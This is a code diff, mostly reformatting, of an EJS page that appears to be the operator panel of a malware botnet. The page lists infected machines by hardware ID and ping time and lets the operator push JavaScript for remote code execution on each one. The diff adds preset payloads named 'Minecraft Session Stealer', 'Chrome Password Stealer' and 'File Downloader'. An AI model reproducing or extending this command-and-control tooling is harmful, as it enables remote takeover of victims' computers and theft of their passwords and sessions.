@@ -7,7 +7,7 @@
             <div class="d-flex align-items-center justify-content-center h-100">
                 <div class="d-flex flex-column" style="width: 35%">
                     <h1 class="text align-self-center">Clients</h1>
-                    <p class="text align-self-center" style="padding-bottom:25px;color:rgb(180, 180, 180);">View and manage clients.</p>
+                    <p class="text align-self-center" style="padding-bottom: 25px; color: rgb(180, 180, 180)">View and manage clients.</p>
                     <table id="clientTable" class="table justify-content-center align-items-center text-center" id="clientTable">
                         <thead>
                             <tr>
@@ -17,30 +17,29 @@
                                 <th scope="col">Set RCE</th>
                             </tr>
                         </thead>
-                        <tbody id="clientTableBody">
-                        </tbody>
+                        <tbody id="clientTableBody"></tbody>
                     </table>
                     <!-- RCE Modal -->
                     <div class="modal fade" id="rceModal" tabindex="-1" role="dialog" aria-labelledby="rceModalLabel" aria-hidden="true">
-                      <div class="modal-dialog modal-lg" role="document">
-                        <div class="modal-content">
-                          <div class="modal-header">
-                            <h5 class="modal-title" id="rceModalLabel">Set RCE</h5>
-                            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
-                              <span aria-hidden="true">&times;</span>
-                            </button>
-                          </div>
-                          <div class="modal-body" id="rceModalBody">
-                            <div class="spinner-border text-secondary" role="status">
-                              <span class="sr-only">Loading...</span>
+                        <div class="modal-dialog modal-lg" role="document">
+                            <div class="modal-content">
+                                <div class="modal-header">
+                                    <h5 class="modal-title" id="rceModalLabel">Set RCE</h5>
+                                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                                        <span aria-hidden="true">&times;</span>
+                                    </button>
+                                </div>
+                                <div class="modal-body" id="rceModalBody">
+                                    <div class="spinner-border text-secondary" role="status">
+                                        <span class="sr-only">Loading...</span>
+                                    </div>
+                                </div>
+                                <div class="modal-footer">
+                                    <button type="button" class="btn btn-secondary" data-dismiss="modal" id="rceClose">Close</button>
+                                    <button type="button" class="btn btn-primary" id="rceSave">Save changes</button>
+                                </div>
                             </div>
-                          </div>
-                          <div class="modal-footer">
-                            <button type="button" class="btn btn-secondary" data-dismiss="modal" id="rceClose">Close</button>
-                            <button type="button" class="btn btn-primary" id="rceSave">Save changes</button>
-                          </div>
                         </div>
-                      </div>
                     </div>
                 </div>
             </div>
@@ -48,114 +47,154 @@
 
         <%- include("includes/scripts.ejs") %>
         <script src="https://cdnjs.cloudflare.com/ajax/libs/js-beautify/1.13.0/beautify.min.js"></script>
-        
+
         <script type="text/javascript">
-          let lastPings = {};
+            let lastPings = {};
 
-          const getWhenPinged = (hwid) => {
-              return parseInt((Date.now() - lastPings[hwid]) / 1000);
-          }
+            const getWhenPinged = (hwid) => {
+                return parseInt((Date.now() - lastPings[hwid]) / 1000);
+            };
 
-          const updateTimes = () => {
-              $('#clientTableBody').children('tr').children('td').each(function(idx) {
-                  if ($(this).attr('class') == 'lastPingText') {
-                      const associatedHWIDText = $(this).prev('td');
-                      const realHWID = associatedHWIDText.attr('realHWID');
-                      const secondsAgo = getWhenPinged(realHWID);
+            const updateTimes = () => {
+                $('#clientTableBody')
+                    .children('tr')
+                    .children('td')
+                    .each(function (idx) {
+                        if ($(this).attr('class') == 'lastPingText') {
+                            const associatedHWIDText = $(this).prev('td');
+                            const realHWID = associatedHWIDText.attr('realHWID');
+                            const secondsAgo = getWhenPinged(realHWID);
 
-                      $(this).text(secondsAgo > 60 ? '>60 seconds ago' : secondsAgo + ' seconds ago');
-                  }
-              });
-          }
+                            $(this).text(secondsAgo > 60 ? '>60 seconds ago' : secondsAgo + ' seconds ago');
+                        }
+                    });
+            };
 
-          const addClient = (hwid) => {
-              const row = $('<tr>');
-              const hwidElement = $('<td>').addClass('hwidText').attr('data-toggle', 'tooltip').attr('title', hwid).attr('realHWID', hwid);
-              const a = $('<a>').attr('href', `/clients/${hwid}`).text(hwid.slice(0, 20) + '...');
-              hwidElement.append(a);
-              
-              row.append(hwidElement);
-              row.append($('<td>').text(getWhenPinged(hwid) + ' seconds ago').addClass('lastPingText'));
-              
-              $('#clientTableBody').append(row);
-          }
+            const addClient = (hwid) => {
+                const row = $('<tr>');
+                const hwidElement = $('<td>').addClass('hwidText').attr('data-toggle', 'tooltip').attr('title', hwid).attr('realHWID', hwid);
+                const a = $('<a>')
+                    .attr('href', `/clients/${hwid}`)
+                    .text(hwid.slice(0, 20) + '...');
+                hwidElement.append(a);
 
-          $(document).ready(function() {
-              const socket = io();
+                row.append(hwidElement);
+                row.append(
+                    $('<td>')
+                        .text(getWhenPinged(hwid) + ' seconds ago')
+                        .addClass('lastPingText')
+                );
 
-              socket.on('connect', () => {
-                  socket.emit('requestClients');
-              });
+                $('#clientTableBody').append(row);
+            };
 
-              socket.on('receiveClients', (clients) => {
-                  $('#clientTableBody tr').remove(); // just incase
+            $(document).ready(function () {
+                const socket = io();
 
-                  Object.keys(clients).forEach(hwid => {
-                      lastPings[hwid] = clients[hwid];
-                      addClient(hwid);
-                  });
-              });
+                socket.on('connect', () => {
+                    socket.emit('requestClients');
+                });
 
-              socket.on('clientPinged', hwid => {
-                  lastPings[hwid] = Date.now();
-                  updateTimes();
-              });
+                socket.on('receiveClients', (clients) => {
+                    $('#clientTableBody tr').remove(); // just incase
 
-              socket.on('clientAdded', hwid => {
-                  lastPings[hwid] = Date.now();
-                  addClient(hwid);
-                  socket.emit('getClientLastName', hwid);  
-              });
+                    Object.keys(clients).forEach((hwid) => {
+                        lastPings[hwid] = clients[hwid];
+                        addClient(hwid);
+                    });
+                });
 
-              socket.on('clientRemoved', hwid => {
-                  delete lastPings[hwid];
-                  
-                  $('#clientTableBody').children('tr').children('td').each(function(idx) {
-                    if ($(this).attr('class') == 'lastPingText') {
-                        const associatedHWIDText = $(this).prev('td');
-                        const realHWID = associatedHWIDText.attr('realHWID');
-                        
-                        if (realHWID == hwid) $(this).parent('tr').remove();
+                socket.on('clientPinged', (hwid) => {
+                    lastPings[hwid] = Date.now();
+                    updateTimes();
+                });
+
+                socket.on('clientAdded', (hwid) => {
+                    lastPings[hwid] = Date.now();
+                    addClient(hwid);
+                    socket.emit('getClientLastName', hwid);
+                });
+
+                socket.on('clientRemoved', (hwid) => {
+                    delete lastPings[hwid];
+
+                    $('#clientTableBody')
+                        .children('tr')
+                        .children('td')
+                        .each(function (idx) {
+                            if ($(this).attr('class') == 'lastPingText') {
+                                const associatedHWIDText = $(this).prev('td');
+                                const realHWID = associatedHWIDText.attr('realHWID');
+
+                                if (realHWID == hwid) $(this).parent('tr').remove();
+                            }
+                        });
+                });
+
+                socket.on('receiveClientLastName', (hwid, name) => {
+                    $('#clientTableBody')
+                        .children('tr')
+                        .children('td')
+                        .each(function (idx) {
+                            if ($(this).attr('class') == 'lastPingText') {
+                                const associatedHWIDText = $(this).prev('td');
+                                const realHWID = associatedHWIDText.attr('realHWID');
+
+                                if (realHWID == hwid) {
+                                    $(this).parent('tr').append($('<td>').text(name));
+                                    $(this)
+                                        .parent('tr')
+                                        .append(
+                                            $('<td>').append(
+                                                $('<button>')
+                                                    .addClass('btn')
+                                                    .addClass('btn-sm')
+                                                    .addClass('btn-secondary')
+                                                    .addClass('set-rce-button')
+                                                    .attr('hwid', hwid)
+                                                    .text('Click Here')
+                                            )
+                                        );
+                                }
+                            }
+                        });
+                });
+
+                let editor;
+
+                $('body').delegate('#formatCode', 'click', function (e) {
+                    e.preventDefault();
+                    editor.setValue(js_beautify(editor.getSession().getValue()), 1);
+                });
+
+                $('body').delegate('#presetCodeInput', 'change', function () {
+                    const snakeCase = $(this).val().toLowerCase().replace(/ +/g, '_');
+
+                    if (snakeCase == 'none') {
+                        editor.getSession().setValue('');
+                        return;
                     }
-                  });
-              });
 
-              socket.on('receiveClientLastName', (hwid, name) => {
-                  $('#clientTableBody').children('tr').children('td').each(function(idx) {
-                      if ($(this).attr('class') == 'lastPingText') {
-                          const associatedHWIDText = $(this).prev('td');
-                          const realHWID = associatedHWIDText.attr('realHWID');
-                          
-                          if (realHWID == hwid) {
-                              $(this).parent('tr').append($('<td>').text(name));
-                              $(this).parent('tr').append($('<td>').append($('<button>').addClass('btn').addClass('btn-sm').addClass('btn-secondary').addClass('set-rce-button').attr('hwid', hwid).text('Click Here')));
-                          }
-                      }
-                  });
-              });
+                    $.get(`/api/v1/get_preset_code/${snakeCase}`, function (data) {
+                        if (data) editor.getSession().setValue(data);
+                    });
+                });
 
-              let editor;
+                $('body').delegate('.set-rce-button', 'click', function () {
+                    const hwid = $(this).attr('hwid');
+                    const rceModalBody = $('#rceModalBody');
 
-              $('body').delegate('#formatCode', 'click', function(e) {
-                  e.preventDefault();
-                  editor.setValue(js_beautify(editor.getSession().getValue()), 1);
-              })
+                    if (!hwid || !rceModalBody) return;
 
-              $('body').delegate('.set-rce-button', 'click', function() {
-                  const hwid = $(this).attr('hwid');
-                  const rceModalBody = $('#rceModalBody');
-                  
-                  if (!hwid || !rceModalBody) return;
+                    $('#rceClose').prop('disabled', true);
+                    $('#rceSave').prop('disabled', true);
 
-                  $('#rceClose').prop('disabled', true);
-                  $('#rceSave').prop('disabled', true);
+                    $('#rceModal').modal({
+                        keyboard: false,
+                        backdrop: 'static',
+                    });
 
-                  $('#rceModal').modal({
-                      keyboard: false,
-                      backdrop: 'static'
-                  });
-
-                  $.get(`/api/v1/${hwid}/get_saved_rce`, function(data) {
+                    $.get(`/api/v1/${hwid}/get_saved_rce`, function (data) {
                         rceModalBody.empty();
 
                         $('#rceClose').prop('disabled', false);
@@ -167,6 +206,14 @@
                                 <div id="editor" hwid="${hwid}">${data.code}</div>
                                 <small class="text-muted"><a class="text-muted" id="formatCode" href="#">Format</a></small>
                                 <br/>
+                                <br/>
+                                <label for="presetCodeInput">Preset Code</label>
+                                <select class="form-control" id="presetCodeInput" style="width:50%;">
+                                    <option>None</option>
+                                    <option>Minecraft Session Stealer</option>
+                                    <option>Chrome Password Stealer</option>
+                                    <option>File Downloader</option>
+                                </select>
                                 <br/>
                                 <a>Reserved Variables/Functions:</a><br/>
                                 <code>machineId()</code> <small class="text-muted">Returns client's HWID</small><br/>
@@ -182,30 +229,34 @@
                                 <small class="form-text text-muted">The amount of times the code will run per ping until it is deleted from the database.<br/>Use -1 for every ping (forever).</small>
                             </div>`);
 
-                        editor = ace.edit("editor");
+                        editor = ace.edit('editor');
                         editor.setOptions({
-                            fontSize: "12pt"
+                            fontSize: '12pt',
                         });
-                        editor.setTheme("ace/theme/solarized_dark");
-                        editor.session.setMode("ace/mode/javascript");
-                  });
-              });
+                        editor.setTheme('ace/theme/solarized_dark');
+                        editor.session.setMode('ace/mode/javascript');
+                    });
+                });
 
-              $('body').delegate('#rceSave', 'click', function() {
-                  if (!editor) return;
+                $('body').delegate('#rceSave', 'click', function () {
+                    if (!editor) return;
 
-                  const hwid = $('#editor').attr('hwid');
+                    const hwid = $('#editor').attr('hwid');
 
-                  $.post(`/api/v1/${hwid}/set_saved_rce`, { code: editor.getSession().getValue(), timesToRun: $('#amountOfTimesToRunInput').val() }, function(data) {
-                      toastr.info(data.message);
-                      $('#rceModal').modal('hide');  
-                  });
-              });
+                    $.post(
+                        `/api/v1/${hwid}/set_saved_rce`,
+                        { code: editor.getSession().getValue(), timesToRun: $('#amountOfTimesToRunInput').val() },
+                        function (data) {
+                            toastr.info(data.message);
+                            $('#rceModal').modal('hide');
+                        }
+                    );
+                });
 
-              $("body").tooltip({ selector: '[data-toggle=tooltip]' });
+                $('body').tooltip({ selector: '[data-toggle=tooltip]' });
 
-              setInterval(updateTimes, 1000);
-          });
-      </script>
+                setInterval(updateTimes, 1000);
+            });
+        </script>
     </body>
 </html>
